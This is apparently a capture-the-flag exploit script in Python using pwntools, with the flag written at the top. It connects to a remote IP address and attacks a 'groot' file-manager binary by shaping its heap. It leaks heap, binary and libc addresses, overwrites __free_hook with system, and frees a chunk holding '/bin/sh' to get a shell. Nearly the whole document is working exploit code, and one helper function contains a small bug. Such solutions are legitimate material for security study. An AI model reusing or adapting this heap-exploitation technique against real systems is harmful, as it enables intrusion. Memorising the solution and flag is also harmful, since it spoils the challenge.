#hitcon{Groot_knows_heap_exploitation:evergreen_tree:}
from pwn import *

def ls(dir = ""):
    r.recvuntil("$ ")
    r.sendline("ls " + dir)
    
def cat(filename):
    r.recvuntil("$ ")
    r.sendline("cat " + filename)
    
def cd(dir):
    r.recvuntil("$ ")
    r.sendline("cd " + dir)
    
def rm(item):
    r.recvuntil("$ ")
    r.sendline("rm " + item)
    
def mv(src, dest):
    r.recvuntil("$ ")
    r.sendline("mv " + src + " " + dest)
    
def mkdir(dir):
    r.recvuntil("$ ")
    r.sendline("mkdir " + dir)
    
def mkfile(filename, content):
    r.recvuntil("$ ")
    r.sendline("mkfile " + filename)
    r.recvuntil("Content? ")
    r.send(content)
    
def touch(filename):
    r.recvuntil("$ ")
    r.sendline("touch " + mkfile)
    
def pwd():
    r.recvuntil("$ ")
    r.sendline("pwd")
    
def ln(src, dest):
    r.recvuntil("$ ")
    r.sendline("ln " + src + " " + dest)
    
def id():
    r.recvuntil("$ ")
    r.sendline("id")
    
#r = process('./groot')
r = remote('54.238.202.201', 31733)

cd("/tmp")
mkfile("dir1"+"a"*0x40, "/bin/sh")
mkfile("dir2"+"a"*0x40, "a")
mkfile("dir3"+"a"*0x40, "a")
mkfile("dir4"+"a"*0x40, "a")
mkfile("dir5"+"a"*0x40, "a")
mkfile("dir6"+"a"*0x40, "a")
mkdir("dir7"+"a"*0x40)
mkdir("dir8"+"a"*0x40)
mkfile("file1"+"a"*0x40, "a")

mkdir("tmp1"+"a"*0x40)
cd("tmp1"+"a"*0x40)
mkfile("filex"+"a"*0x40, "a")
cd("..")
rm("tmp1"+"a"*0x40)
mkdir("tmp2"+"a"*0x40)
rm("tmp2"+"a"*0x40)
rm("dir7"+"a"*0x40)
rm("dir8"+"a"*0x40)
mkfile("file2"+"a"*0x40, "a")
mkfile("file3"+"a"*0x40, "a")

rm("dir6"+"a"*0x40)
rm("file1"+"a"*0x40)
rm("file2"+"a"*0x40)
cat("file3"+"a"*0x40)
tmp = r.recv(6).ljust(8, "\x00")
heap = u64(tmp) - 0x12fe0 + 0x260 - 0x3b0
log.info("heap: %#x" %heap)
fake = heap + 0x12b48
log.info("fake: %#x" %fake)

rm("file3"+"a"*0x40)
mkfile("file2"+"a"*0x40, p64(fake))
mkfile("file3"+"a"*0x40, p64(fake))
mkfile("file4"+"a"*0x40, p64(heap+0x129a8)) #4
cat("/home/groot/flag")
tmp = r.recv(6).ljust(8, "\x00")
base = u64(tmp)-0x204040
log.info("base: %#x" %base)

rm("dir5"+"a"*0x40)
rm("dir4"+"a"*0x40)
rm("dir3"+"a"*0x40)
rm("dir2"+"a"*0x40)
rm("file3"+"a"*0x40)
rm("file2"+"a"*0x40)

mkfile("file2"+"a"*0x40, p64(heap+0x12008))
mkfile("file3"+"a"*0x40, p64(heap+0x12008))
mkfile("file5"+"a"*0x40, p64(base+0x203fd0)) #5
cat("/etc/passwd")

tmp = r.recv(6).ljust(8, "\x00")
libc = u64(tmp) - 0xe4840
log.info("libc: %#x" %libc)
system = libc + 0x4f440
log.info("system: %#x" %system)
free_hook = libc + 0x3ed8e8
log.info("free_hook: %#x" %free_hook)
rm("file3"+"a"*0x40)
rm("file2"+"a"*0x40)
mkfile("file2"+"a"*0x40, p64(free_hook))
mkfile("file3"+"a"*0x40, p64(free_hook))
mkfile("file6"+"a"*0x40, p64(system)) #6
rm("dir1"+"a"*0x40)
r.interactive()
